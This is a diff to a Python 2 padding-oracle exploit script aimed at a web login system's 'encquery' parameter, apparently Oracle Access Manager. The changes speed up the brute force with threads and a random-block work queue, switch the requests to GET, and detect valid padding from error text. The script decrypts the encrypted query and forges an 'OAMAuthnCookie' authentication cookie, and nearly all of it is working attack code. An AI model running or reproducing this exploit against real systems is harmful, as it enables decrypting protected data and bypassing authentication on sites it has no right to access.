@@ -16,32 +16,33 @@ import md5
 import urllib3
 import binascii
 import argparse
-from Queue import Queue
+from Queue import Queue, Empty
 from threading import Thread
 import threading
 import copy
+import random
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
 urllib3.disable_warnings(urllib3.exceptions.SNIMissingWarning)
 
-test_url = "https://{}/protected/?AAAAAAAAAAAAA" # Adapt to correct URL
+test_url = "http://{}/?AAAAAAAAAAAAA" # Adapt to correct URL
 num_threads = 10        # You can play with this value
 headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}
 
 class Oracle:
 
     def __init__(self, url):
-        self.url = url                                  # Full URL, encoded
+        self.url = url                                  # Full URL, decoded
         self.block_size = 0
         
     def set_eq(self, eq):
-        prefix = self.url.split("encquery=")[0]
-        suffix = self.url.split("agentid=")[1]
-        self.url = prefix + "encquery=" + eq + " agentid=" + suffix
+        prefix = self.url.split("encquery")[0]
+        suffix = self.url.split("agentid")[1]
+        self.url = prefix + "encquery=" + get_url_enc(eq + "%20agentid" + suffix)
 
     def get_eq(self):
-        encquery = self.url.split("encquery=")[1].split(" agentid")[0]
+        encquery = self.url.split("encquery=")[1].split("%20agentid")[0]
         return encquery
 
     def get_block(self, i):
@@ -68,16 +69,14 @@ class Worker(threading.Thread):
 # HELPER FUNCTIONS
 
 def get_url_dec(url):
-    url_decoded = urllib.unquote(url).decode('utf8')
-    return url_decoded 
+    return url.replace("%2B","+").replace("%2F","/").replace("%3D","=")
 
 def get_b64_dec(url):
     b64_decoded = base64.b64decode(url) 
     return b64_decoded
 
 def get_url_enc(url):
-    url_encoded = urllib.quote(url)
-    return url_encoded
+    return url.replace("+","%2B").replace("/","%2F").replace("=","%3D")
 
 def get_b64_enc(binary):
     b64_encoded = base64.b64encode(binary)
@@ -103,7 +102,7 @@ def print_dot():
 def send_url(url):
     global headers, proxy
     try:
-        response = requests.head(url, allow_redirects=False, headers=headers, verify=False)
+        response = requests.get(url, allow_redirects=False, headers=headers, verify=False)
     except requests.exceptions.RequestException as e:
         print e
         sys.exit(1)
@@ -116,7 +115,7 @@ def send_url(url):
     return response
 
 def valid_padding(response):
-    return str(response.status_code) == '302'
+    return not "System error" in response.text
 
 # MAIN FUNCTIONS
 
@@ -150,51 +149,71 @@ def find_block_size():
 def find_space_block(oracle):
     # Brute force the random block until it is accepted (302 response instead of 200)
     # Then we know that random block starts with space character (when decrypted)
+    global num_threads
 
+    work_queue = Queue()
     result_queue = Queue(maxsize=0)
-    max_tries = 256 
-    p("Sending URLs with random block to trigger padding oracle")
+    max_tries = 2000
+    p("Sending a maximum of " + str(max_tries) + " URLs with a random block to find one that decrypts to a space at position 0")
 
     for i in range(max_tries):
+        brute_force_block = str(bytearray(random.getrandbits(8) for _ in xrange(oracle.block_size)))
+        work_queue.put(brute_force_block)
+
+    for i in range(num_threads):
         oracle_copy = copy.deepcopy(oracle)
-        threads = [Thread(target=find_space_block_thread, args=(i,oracle_copy,result_queue))]
+        threads = [Thread(target=find_space_block_thread, args=(oracle_copy, work_queue, result_queue))]
         for t in threads:
             t.start()
 
-    for i in range(max_tries):
-        r = result_queue.get()
-        print_dot()
-        if r is not None:
-            p("\nBlock with space character found")
-            p("THIS WEBSITE IS VULNERABLE TO PADDING ORACLE ATTACK", False)
-            return r 
-
-    p("ERROR: Unable to find a block with space character within "+str(max_tries)+" tries", False)
-    sys.exit(1)
-
-def find_space_block_thread(i, oracle, result_queue):
-    n = oracle.get_num_blocks()
-    valid_msg = oracle.get_binary()[:-1*oracle.block_size]
-    last_2_blocks = oracle.get_block(n-1) + oracle.get_block(n)
-
-    brute_force_block = bytearray(oracle.block_size) 
-    brute_force_block[0] = i
-    brute_force_block = str(brute_force_block)
+    work_queue.join()
     
-    new_encquery_binary = valid_msg + brute_force_block + last_2_blocks
-    new_encquery_encoded = get_b64_enc(new_encquery_binary)
-    oracle.set_eq(new_encquery_encoded)
+    try:
+        r = result_queue.get(block=False)
+        p("Block with space character found")
+        p(" >>> VULNERABLE TO PADDING ORACLE ATTACK <<<", False)
+        return r 
+    except Empty as e:
+        p("ERROR: Unable to find a block with space character within "+str(max_tries)+" tries, aborting", False)
+        sys.exit(1)
 
-    r = send_url(oracle.url)
+def find_space_block_thread(oracle, work_queue, result_queue):
+    original_eq = oracle.get_eq()
+    while True:
+        # Try to get a new brute_force_block to work with
+        try:
+            brute_force_block = work_queue.get(block=False)
+        except Empty as e:
+            return
 
-    if valid_padding(r):
-        result_queue.put(oracle)
-    else:
-        result_queue.put(None)
+        # Inject the brute_force_block at the right place in the encquery
+        n = oracle.get_num_blocks()
+        valid_msg = oracle.get_binary()[:-1*oracle.block_size]
+        last_2_blocks = oracle.get_block(n-1) + oracle.get_block(n)
+        new_encquery_binary = valid_msg + brute_force_block + last_2_blocks
+        new_encquery_b64 = get_b64_enc(new_encquery_binary)
+        oracle.set_eq(new_encquery_b64)
+
+        # Send request
+        r = send_url(oracle.url)
+        work_queue.task_done()
+       
+        # If successful, save result and empty the work_queue
+        if valid_padding(r):
+            result_queue.put(oracle)
+            while True:
+                try: 
+                    work_queue.get(block=False)
+                except Empty as e:
+                    return
+                work_queue.task_done()
+        
+        # Reset encquery
+        oracle.set_eq(original_eq)
 
 #STAGE 3
 def decrypt_encquery(oracle):
-		# Print encquery string
+    # Print encquery string
     p(get_b64_enc(oracle.get_binary()[:-3*oracle.block_size]), False)
     # Iterate blocks from block 2 (block 1 is IV) up to block n-3 (skip last_2_blocks and random_block)    
     decryption(oracle, 2, oracle.get_num_blocks()-3)
@@ -209,6 +228,7 @@ def decrypt_cookie(oracle, cookie_b64):
 def decryption(oracle, start_block, end_block):
     # Decrypt using the given oracle
     global num_threads
+    total_time = 0
 
     # Multithreading. 
     # Have a queue to add work and a queue to collect results
@@ -220,8 +240,8 @@ def decryption(oracle, start_block, end_block):
     threads = [Worker((work_queue, found_list, found_lock, result_queue)) for i in range(num_threads)]
   
     # Initialize result arrays because we will not fill them sequentially
-    intermediate_array = bytearray(oracle.get_num_blocks()*oracle.block_size)
-    plaintext_array = bytearray(oracle.get_num_blocks()*oracle.block_size)
+    intermediate_array = bytearray((oracle.get_num_blocks())*oracle.block_size)
+    plaintext_array = bytearray((oracle.get_num_blocks())*oracle.block_size)
 
     for t in threads:
         t.start()
@@ -259,17 +279,23 @@ def decryption(oracle, start_block, end_block):
         # Finish up
         with found_lock:
             del found_list[:]
+        
         elapsed = time.time() - timer_start
-        timer_start = time.time()
-        plaintext = str(plaintext_array[(start_block-1)*oracle.block_size:])
-        p("\nFound bytes on position %i for all blocks in %.2fs. Plaintext so far: %s" %(byte, elapsed, plaintext))
+        total_time += elapsed
+        
+        plaintext = str(plaintext_array[(start_block-1)*oracle.block_size:]).rstrip("\x00").replace("\x00","_")
+        if(byte > 0):
+            p("\nFound bytes on position %i for all blocks in %.2fs. Plaintext so far: \n%s" %(byte, elapsed, plaintext))
 
-    p("Decryption completed. Plaintext:\n"+plaintext)
+    p("Decryption completed in %.2fs. Plaintext:\n%s" %(total_time, plaintext))
     sys.exit(1)
 
 def padding_oracle_attack_thread(work_queue, found_list, found_lock, result_queue):
     while True:
-        oracle, block, byte, byte_val, intermediate_array = work_queue.get()
+        try:
+            oracle, block, byte, byte_val, intermediate_array = work_queue.get(timeout=3)
+        except Empty as e:
+            return
 
         # First check if some other thread already found the solution for this block-byte
         with found_lock:
@@ -291,11 +317,11 @@ def padding_oracle_attack_thread(work_queue, found_list, found_lock, result_queu
             c1q[m] = xor(padding_byte, i2[m])
             
         data = prefix + str(c1q) + str(c2)
-        encquery_b64_encoded = get_b64_enc(data)
+        encquery_b64 = get_b64_enc(data)
 
         # Create temporary oracle for new eq and send it off
         test_oracle = Oracle(oracle.url)
-        test_oracle.set_eq(encquery_b64_encoded)
+        test_oracle.set_eq(encquery_b64)
         r = send_url(test_oracle.url)
 
         # If we have valid padding we can deduce the value of i2. 
@@ -373,10 +399,7 @@ def encryption(oracle, plaintext):
     p("\nFound ciphertext of IV: "+binascii.hexlify(c2))
     ciphertext = c2 + ciphertext
 
-    OAMAuthnCookie_enc = str(get_b64_enc(ciphertext))
-    OAMAuthnCookie_enc = OAMAuthnCookie_enc.replace('+','%2B')
-    OAMAuthnCookie_enc = OAMAuthnCookie_enc.replace('/','%2F')
-    OAMAuthnCookie_enc = OAMAuthnCookie_enc.replace('=','%3D')
+    OAMAuthnCookie_enc = get_url_enc(get_b64_enc(ciphertext))
     p("Authentication cookie found:", False)
     p("OAMAuthnCookie="+str(OAMAuthnCookie_enc),False)
 
